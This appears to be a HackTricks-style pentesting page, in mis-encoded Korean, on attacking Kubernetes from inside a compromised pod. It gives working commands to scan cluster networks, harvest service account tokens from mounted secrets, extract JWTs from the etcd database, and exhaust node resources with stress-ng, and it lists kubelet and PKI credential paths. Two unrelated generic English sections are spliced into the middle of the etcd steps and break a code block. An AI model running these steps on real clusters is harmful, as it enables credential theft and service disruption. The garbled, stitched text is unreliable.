# íŒŒë“œ ë‚´ë¶€ì—ì„œ Kubernetes ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

## **Pod íƒˆì¶œ**

**ìš´ì´ ì¢‹ë‹¤ë©´ ì´ë¥¼ í†µí•´ ë…¸ë“œë¡œ íƒˆì¶œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### íŒŒë“œë¡œë¶€í„° íƒˆì¶œ

íŒŒë“œì—ì„œ íƒˆì¶œí•˜ë ¤ë©´ ë¨¼ì € **ê¶Œí•œ ìƒìŠ¹**ì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ëª‡ ê°€ì§€ ê¸°ìˆ :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ì»´í”„ë¼ë§ˆì´ì¦ˆëœ íŒŒë“œì—ì„œ **íƒˆì¶œì„ ì‹œë„í•˜ê¸° ìœ„í•œ ë„ì»¤ íƒˆì¶œ**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes ê¶Œí•œ ë‚¨ìš©

**Kubernetes ì—´ê±°** ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

ì¼ë°˜ì ìœ¼ë¡œ íŒŒë“œëŠ” ë‚´ë¶€ì— **ì„œë¹„ìŠ¤ ê³„ì • í† í°**ì´ í•¨ê»˜ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ ê³„ì •ì—ëŠ” **ë‚¨ìš©í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì´ ë¶€ì—¬ë  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ë‹¤ë¥¸ íŒŒë“œë¡œ **ì´ë™**í•˜ê±°ë‚˜ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ êµ¬ì„±ëœ ë…¸ë“œë¡œ **íƒˆì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### í´ë¼ìš°ë“œ ê¶Œí•œ ë‚¨ìš©

íŒŒë“œê°€ **í´ë¼ìš°ë“œ í™˜ê²½**ì—ì„œ ì‹¤í–‰ëœë‹¤ë©´ **ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì—ì„œ í† í°ì„ ë…¸ì¶œ**í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì·¨ì•½í•œ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ ê²€ìƒ‰

Kubernetes í™˜ê²½ ë‚´ë¶€ì— ìˆìœ¼ë¯€ë¡œ í˜„ì¬ íŒŒë“œì˜ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê±°ë‚˜ ì»¨í…Œì´ë„ˆë¥¼ íƒˆì¶œí•  ìˆ˜ ì—†ëŠ” ê²½ìš° **ì ì¬ì ìœ¼ë¡œ ì·¨ì•½í•œ ì„œë¹„ìŠ¤ë¥¼ ì°¾ì•„ì•¼**í•©ë‹ˆë‹¤.

### ì„œë¹„ìŠ¤

**ì´ë¥¼ ìœ„í•´ Kubernetes í™˜ê²½ì˜ ëª¨ë“  ì„œë¹„ìŠ¤ë¥¼ ê°€ì ¸ì˜¤ë ¤ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```
kubectl get svc --all-namespaces
```
ê¸°ë³¸ì ìœ¼ë¡œ KubernetesëŠ” í‰ë©´ ë„¤íŠ¸ì›Œí‚¹ ìŠ¤í‚¤ë§ˆë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ **í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ëª¨ë“  pod/serviceê°€ ì„œë¡œ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. í´ëŸ¬ìŠ¤í„° ë‚´ì˜ **ë„¤ì„ìŠ¤í˜ì´ìŠ¤**ëŠ” **ê¸°ë³¸ì ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤**. ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì˜ ëˆ„êµ¬ë‚˜ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìŠ¤ìºë‹

ë‹¤ìŒ Bash ìŠ¤í¬ë¦½íŠ¸( [Kubernetes workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ì—ì„œ ê°€ì ¸ì˜´)ëŠ” Kubernetes í´ëŸ¬ìŠ¤í„°ì˜ IP ë²”ìœ„ë¥¼ ì„¤ì¹˜í•˜ê³  ìŠ¤ìº”í•©ë‹ˆë‹¤:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ **Kubernetes íŠ¹ì • ì„œë¹„ìŠ¤ë¥¼ ê³µê²©**í•˜ì—¬ **ë‹¤ë¥¸ íŒŸ/í™˜ê²½ ì „ì²´ë¥¼ ì¹¨í•´**í•˜ëŠ” ë°©ë²•ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### ìŠ¤ë‹ˆí•‘

**ì¹¨í•´ë‹¹í•œ íŒŸì´ ë¯¼ê°í•œ ì„œë¹„ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš°** ë‹¤ë¥¸ íŒŸì´ ì¸ì¦í•´ì•¼ í•˜ëŠ” ê²½ìš°, **ë¡œì»¬ í†µì‹ ì„ ìŠ¤ë‹ˆí•‘**í•˜ì—¬ ë‹¤ë¥¸ íŒŸì—ì„œ ë³´ë‚¸ ìê²© ì¦ëª…ì„ íšë“í•  ìˆ˜ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë„¤íŠ¸ì›Œí¬ ìŠ¤í‘¸í•‘

ê¸°ë³¸ì ìœ¼ë¡œ **ARP ìŠ¤í‘¸í•‘**ê³¼ (ê·¸ë¡œ ì¸í•œ **DNS ìŠ¤í‘¸í•‘** ë•ë¶„ì—) ê°™ì€ ê¸°ë²•ì´ Kubernetes ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, íŒŸ ë‚´ì—ì„œ, **NET\_RAW ëŠ¥ë ¥**ì´ ìˆëŠ” ê²½ìš° (ê¸°ë³¸ì ìœ¼ë¡œ ì œê³µë¨), ì‚¬ìš©ì ì •ì˜ë¡œ ì œì‘ëœ ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ë³´ë‚´ê³  **ë™ì¼ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ëª¨ë“  íŒŸì— ëŒ€í•´ ARP ìŠ¤í‘¸í•‘ì„ í†µí•œ MitM ê³µê²©ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê²Œë‹¤ê°€, **ì•…ì˜ì ì¸ íŒŸ**ì´ **DNS ì„œë²„ì™€ ë™ì¼í•œ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš°**, í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  íŒŸì— ëŒ€í•´ **DNS ìŠ¤í‘¸í•‘ ê³µê²©ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## ë…¸ë“œ DoS

Kubernetes ë§¤ë‹ˆí˜ìŠ¤íŠ¸ì—ëŠ” ìì›ì— ëŒ€í•œ ëª…ì‹œê°€ ì—†ìœ¼ë©°, ì»¨í…Œì´ë„ˆì— ëŒ€í•œ **ì ìš©ëœ ì œí•œ ë²”ìœ„ê°€ ì—†ìŠµë‹ˆë‹¤**. ê³µê²©ìë¡œì„œ, **íŒŸ/ë°°í¬ê°€ ì‹¤í–‰ ì¤‘ì¸ ìì›ì„ ëª¨ë‘ ì†Œë¹„**í•˜ì—¬ ë‹¤ë¥¸ ìì›ì„ ê³ ê°ˆì‹œí‚¤ê³  í™˜ê²½ì— ëŒ€í•œ DoSë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
ë‹¹ì‹ ì€ `stress-ng`ë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆê³¼ ê·¸ í›„ì˜ ì°¨ì´ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ë…¸ë“œ í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡ë ˆì´ì…˜

ë§Œì•½ **ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œ**ì— ì„±ê³µí–ˆë‹¤ë©´ ë…¸ë“œì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ í¥ë¯¸ë¡œìš´ ì‚¬í•­ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- **ì»¨í…Œì´ë„ˆ ëŸ°íƒ€ì„** í”„ë¡œì„¸ìŠ¤ (ë„ì»¤)
- ì´ ì»¨í…Œì´ë„ˆì™€ ê°™ì´ ë‚¨ì€ **íŒŸ/ì»¨í…Œì´ë„ˆ**ë“¤ (ë” ë§ì€ í† í°)
- ì „ì²´ **íŒŒì¼ ì‹œìŠ¤í…œ** ë° **OS**
- ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ **Kube-Proxy** ì„œë¹„ìŠ¤
- ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ **Kubelet** ì„œë¹„ìŠ¤. êµ¬ì„± íŒŒì¼ í™•ì¸:
  - ë””ë ‰í† ë¦¬: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- ë‹¤ë¥¸ **ì¿ ë²„ë„¤í‹°ìŠ¤ ê³µí†µ íŒŒì¼**:
  - `$HOME/.kube/config` - **ì‚¬ìš©ì êµ¬ì„±**
  - `/etc/kubernetes/kubelet.conf`- **ì¼ë°˜ êµ¬ì„±**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd êµ¬ì„±**
  - `/etc/kubernetes/pki` - **ì¿ ë²„ë„¤í‹°ìŠ¤ í‚¤**

### ë…¸ë“œ kubeconfig ì°¾ê¸°

ì´ì „ì— ì–¸ê¸‰ëœ ê²½ë¡œ ì¤‘ ì–´ë””ì—ì„œë„ kubeconfig íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ì—†ë‹¤ë©´, kubelet í”„ë¡œì„¸ìŠ¤ì˜ ì¸ìˆ˜ `--kubeconfig`ì„ í™•ì¸í•˜ì„¸ìš”:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### ë¹„ë°€ ìœ ì¶œ
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
ìŠ¤í¬ë¦½íŠ¸ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)ì€ ìë™ìœ¼ë¡œ **ë‹¤ë¥¸ íŒŸì˜ í† í°ì„ ê°€ì ¸ì™€ ê¶Œí•œì„ í™•ì¸**í•˜ì—¬ ì›í•˜ëŠ” ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤ (1ëŒ€1ë¡œ í™•ì¸í•˜ëŠ” ëŒ€ì‹ ):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### íŠ¹ê¶Œ DaemonSets

DaemonSetì€ í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œì—ì„œ ì‹¤í–‰ë  **íŒŸ**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ êµ¬ì„±ëœ DaemonSetì´ ìˆë‹¤ë©´, **ëª¨ë“  ë…¸ë“œ**ì—ì„œ í•´ë‹¹ **íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •ì˜ í† í°**ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì€ ì´ì „ ì„¹ì…˜ê³¼ ë™ì¼í•˜ì§€ë§Œ, ì´ì œ ìš´ì— ì˜ì¡´í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

### í´ë¼ìš°ë“œë¡œ Pivot

í´ëŸ¬ìŠ¤í„°ê°€ í´ë¼ìš°ë“œ ì„œë¹„ìŠ¤ë¡œ ê´€ë¦¬ë˜ëŠ” ê²½ìš°, **ë…¸ë“œëŠ” Podì™€ëŠ” ë‹¤ë¥¸ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ **ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤**í•˜ë ¤ê³  ì‹œë„í•˜ì‹­ì‹œì˜¤ (ë˜ëŠ” hostNetworkê°€ Trueë¡œ ì„¤ì •ëœ íŒŸì—ì„œ):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcd ë„ìš©

ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ë…¸ë“œì˜ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ë¥¼ ì§€ì •í•  ìˆ˜ ìˆë‹¤ë©´, ì œì–´ í”Œë ˆì¸ ë…¸ë“œ ë‚´ì—ì„œ ì‰˜ì„ íšë“¤í•˜ê³  **etcd ë°ì´í„°ë² ì´ìŠ¤**ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane ë…¸ë“œëŠ” **ë§ˆìŠ¤í„° ì—­í• **ì„ ê°–ê³  ìˆìœ¼ë©° **í´ë¼ìš°ë“œ ê´€ë¦¬ í´ëŸ¬ìŠ¤í„°ì—ì„œëŠ” í•´ë‹¹ ë…¸ë“œì—ì„œ ì•„ë¬´ ê²ƒë„ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

#### etcdì—ì„œ ì‹œí¬ë¦¿ ì½ê¸°

íŒŸ ìŠ¤í™ì—ì„œ `nodeName` ì…€ë ‰í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì»¨íŠ¸ë¡¤ í”Œë ˆì¸ ë…¸ë“œì—ì„œ íŒŸì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´, í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  êµ¬ì„±ë¬¼ ë° ëª¨ë“  ì‹œí¬ë¦¿ì„ í¬í•¨í•˜ëŠ” `etcd` ë°ì´í„°ë² ì´ìŠ¤ì— ì‰½ê²Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ëŠ” í˜„ì¬ ì‘ì—… ì¤‘ì¸ ì»¨íŠ¸ë¡¤ í”Œë ˆì¸ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ `etcd`ì—ì„œ ì‹œí¬ë¦¿ì„ ê°€ì ¸ì˜¤ëŠ” ë¹ ë¥´ê³  ê°„ë‹¨í•œ ë°©ë²•ì…ë‹ˆë‹¤. `etcdctl` í´ë¼ì´ì–¸íŠ¸ ìœ í‹¸ë¦¬í‹°ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŸì„ ìƒì„±í•˜ê³  í•´ë‹¹ íŒŸì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì—ì„œë“  ì‹¤í–‰ ì¤‘ì¸ `etcd`ì— ì—°ê²°í•˜ëŠ” ì»¨íŠ¸ë¡¤ í”Œë ˆì¸ ë…¸ë“œ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ëŠ” ë” ìš°ì•„í•œ ì†”ë£¨ì…˜ì„ ì›í•œë‹¤ë©´, @mauilionì˜ [ì´ ì˜ˆì œ ë§¤ë‹ˆí˜ìŠ¤íŠ¸](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

**ì»¨íŠ¸ë¡¤ í”Œë ˆì¸ ë…¸ë“œì—ì„œ `etcd`ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸í•˜ê³  ë°ì´í„°ë² ì´ìŠ¤ê°€ ì–´ë””ì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤ (ì´ëŠ” `kubeadm`ìœ¼ë¡œ ìƒì„±ëœ í´ëŸ¬ìŠ¤í„°ì—ì„œ ì§„í–‰ë©ë‹ˆë‹¤)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, either through a compromised container or by exploiting a vulnerability, they can leverage this access to further compromise the entire Kubernetes cluster. This article explores various techniques that an attacker can use to escalate privileges and move laterally within a Kubernetes cluster from inside a pod.

### Escalating Privileges

#### Accessing the Kubernetes API

Once inside a pod, an attacker can attempt to access the Kubernetes API server using service account tokens mounted inside the pod. By default, pods have service account tokens that allow them to authenticate with the Kubernetes API. If the attacker can access these tokens, they can interact with the API server and potentially perform malicious actions.

#### Exploiting Kubernetes RBAC

If the pod has excessive permissions granted through Kubernetes Role-Based Access Control (RBAC) policies, the attacker can abuse these permissions to escalate their privileges within the cluster. For example, if a pod has permissions to create or modify resources across namespaces, the attacker can exploit this to gain more control over the cluster.

### Moving Laterally

#### Pod Hopping

Once inside a pod, the attacker can move laterally by hopping from one pod to another within the same node or across different nodes in the cluster. This can be achieved by leveraging Kubernetes API access to discover and interact with other pods, potentially spreading the attack across multiple parts of the cluster.

#### Exploiting Kubernetes Networking

By exploiting misconfigurations in Kubernetes networking policies, an attacker can attempt to communicate with pods running on different nodes or in different namespaces. This can help the attacker move laterally and reach sensitive parts of the cluster that would otherwise be isolated.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the internal threats that can arise from compromised pods. By understanding how attackers can escalate privileges and move laterally within a cluster, organizations can better defend against such attacks and ensure the security of their Kubernetes deployments.
```bash
data-dir=/var/lib/etcd
```
**etcd ë°ì´í„°ë² ì´ìŠ¤ì˜ ë°ì´í„° ë³´ê¸°:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ í† í°ì„ ì¶”ì¶œí•˜ê³  ì„œë¹„ìŠ¤ ê³„ì • ì´ë¦„ì„ í‘œì‹œí•©ë‹ˆë‹¤**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ë™ì¼í•œ ëª…ë ¹ì–´ì´ì§€ë§Œ kube-system ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ê¸°ë³¸ í† í°ë§Œ ë°˜í™˜í•˜ë„ë¡ ì¼ë¶€ grepsë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are already inside the cluster and can potentially access other pods and resources. This section covers some techniques that an attacker can use to escalate privileges and move laterally within the cluster.

### Accessing the Kubernetes API

Once inside a pod, an attacker can access the Kubernetes API using the pod's service account token. This can allow them to gather information about the cluster, create or delete resources, and perform other malicious activities.

### Mounting Host Paths

By mounting host paths into a pod, an attacker can access sensitive files and directories on the host machine. This can lead to further privilege escalation and compromise of the entire cluster.

### Exploiting Misconfigurations

Attackers can exploit misconfigurations in pod security policies, network policies, and other Kubernetes configurations to gain additional privileges and access within the cluster.

### Summary

When an attacker compromises a Kubernetes pod, they can leverage various techniques to further infiltrate the cluster and carry out malicious activities. It is crucial for organizations to secure their Kubernetes clusters and regularly audit for any vulnerabilities that could be exploited by attackers.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### ì •ì /ê±°ìš¸í™”ëœ íŒŒë“œ ì§€ì†ì„±

_ì •ì  íŒŒë“œ_ëŠ” API ì„œë²„ê°€ ê´€ì°°í•˜ì§€ ì•Šê³  íŠ¹ì • ë…¸ë“œì˜ kubelet ë°ëª¬ì— ì˜í•´ ì§ì ‘ ê´€ë¦¬ë©ë‹ˆë‹¤. (ì˜ˆ: ë°°í¬ì™€ ê°™ì´) **kubeletëŠ” ê° ì •ì  íŒŒë“œë¥¼ ê°ì‹œ**í•˜ë©° ì‹¤íŒ¨ ì‹œ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ì •ì  íŒŒë“œëŠ” í•­ìƒ íŠ¹ì • ë…¸ë“œì˜ **í•˜ë‚˜ì˜ Kubeletì— ë°”ì¸ë”©**ë©ë‹ˆë‹¤.

**kubeletì€ ê° ì •ì  íŒŒë“œì— ëŒ€í•´ Kubernetes API ì„œë²„ì— ë¯¸ëŸ¬ íŒŒë“œë¥¼ ìë™ìœ¼ë¡œ ìƒì„±**í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤. ì´ëŠ” ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ íŒŒë“œê°€ API ì„œë²„ì—ì„œ ë³¼ ìˆ˜ ìˆì§€ë§Œ ê±°ê¸°ì„œ ì œì–´í•  ìˆ˜ ì—†ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. íŒŒë“œ ì´ë¦„ì€ ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ê³¼ ì„ í–‰ í•˜ì´í”ˆì´ ë¶™ì€ ì ‘ë¯¸ì‚¬ê°€ ë  ê²ƒì…ë‹ˆë‹¤.

{% hint style="danger" %}
ì •ì  íŒŒë“œì˜ **`spec`ì€ ë‹¤ë¥¸ API ê°ì²´ë¥¼ ì°¸ì¡°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤** (ì˜ˆ: ServiceAccount, ConfigMap, Secret ë“±). ë”°ë¼ì„œ í˜„ì¬ ë…¸ë“œì—ì„œ ì„ì˜ì˜ serviceAccountë¡œ íŒŒë“œë¥¼ ì‹œì‘í•˜ì—¬ í´ëŸ¬ìŠ¤í„°ë¥¼ ì¹¨í•´í•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ íŒŒë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ëŠ” ìˆìŠµë‹ˆë‹¤ (í•„ìš”í•œ ê²½ìš°).
{% endhint %}

ë…¸ë“œ í˜¸ìŠ¤íŠ¸ ë‚´ë¶€ì— ìˆë‹¤ë©´ **ìì²´ ë‚´ë¶€ì— ì •ì  íŒŒë“œë¥¼ ìƒì„±**í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **kube-system**ê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— **íŒŒë“œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê²Œ í•´ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

